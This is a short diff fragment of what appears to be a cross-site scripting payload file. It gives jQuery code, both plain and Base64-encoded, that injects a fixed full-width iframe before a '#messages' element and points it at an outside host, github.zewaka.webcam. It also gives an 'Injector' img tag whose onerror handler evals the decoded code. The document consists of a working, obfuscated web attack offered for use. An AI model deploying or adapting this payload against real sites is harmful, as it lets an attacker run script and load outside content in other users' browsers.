@@ -6,6 +6,7 @@ $("#goonRadio iframe").attr("src", "http://github.zewaka.webcam");
 
 Base64 Encoded:
 JCgiI2dvb25SYWRpbyIpLnJlbW92ZSgpOwokKCI8ZGl2IGlkPSdnb29uUmFkaW8nIHN0eWxlPSdwb3NpdGlvbjogZml4ZWQ7IGxlZnQ6IDA7IHRvcDogMDsgcmlnaHQ6IDgwcHg7IGhlaWdodDogNDBweDsgYmFja2dyb3VuZDogd2hpdGU7IHotaW5kZXg6IDk5OTk5OTk5Oyc+PGlmcmFtZSBzcmM9J2Fib3V0OmJsYW5rJyBzdHlsZT0nd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgYm9yZGVyOiBub25lOyc+PC9pZnJhbWU+PC9kaXY+IikuaW5zZXJ0QmVmb3JlKCIjbWVzc2FnZXMiKTsKJCgiI2dvb25SYWRpbyBpZnJhbWUiKS5hdHRyKCJzcmMiLCAiaHR0cDovL2dpdGh1Yi56ZXdha2Eud2ViY2FtIik7
+
 Injector:
 <img src="x" onerror='eval(atob("BASE64HERE")); return false;' width='1' height='1'>
 
